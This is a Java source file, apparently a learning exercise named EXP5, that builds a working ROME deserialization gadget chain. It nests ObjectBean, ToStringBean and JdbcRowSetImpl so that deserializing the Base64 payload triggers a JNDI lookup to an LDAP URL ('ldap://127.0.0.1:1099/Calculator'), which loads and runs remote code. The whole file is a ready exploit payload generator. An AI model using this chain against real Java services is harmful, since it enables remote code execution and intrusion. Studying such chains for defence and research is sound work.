package com.example;

import com.sun.rowset.JdbcRowSetImpl;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.sql.rowset.JdbcRowSet;
import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;

public class EXP5 {
    public static void main(String[] args) throws Exception{
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        String url = "ldap://127.0.0.1:1099/Calculator";
        jdbcRowSet.setDataSourceName(url);

        ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class,"1"); //要用JdbcRowSetImpl.class不能用JdbcRowSet.class,
        ObjectBean objectBean = new ObjectBean(ToStringBean.class,toStringBean);
        HashMap<Object,Object> hashMap = new HashMap<>();
        hashMap.put(objectBean,"123");

        Field field = toStringBean.getClass().getDeclaredField("_obj");
        field.setAccessible(true);
        field.set(toStringBean,jdbcRowSet);
        String s=serialize(hashMap);
        deserialize(s);


    }
    public static void SetFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field declaredField = obj.getClass().getDeclaredField(fieldName);
        declaredField.setAccessible(true);
        declaredField.set(obj, value);
    }
    public static String serialize(Object obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }
    public static Object deserialize(String data) throws Exception {
        ByteArrayInputStream bais = new ByteArrayInputStream(Base64.getDecoder().decode(data));
        ObjectInputStream ois = new ObjectInputStream(bais);
        return ois.readObject();
    }
}
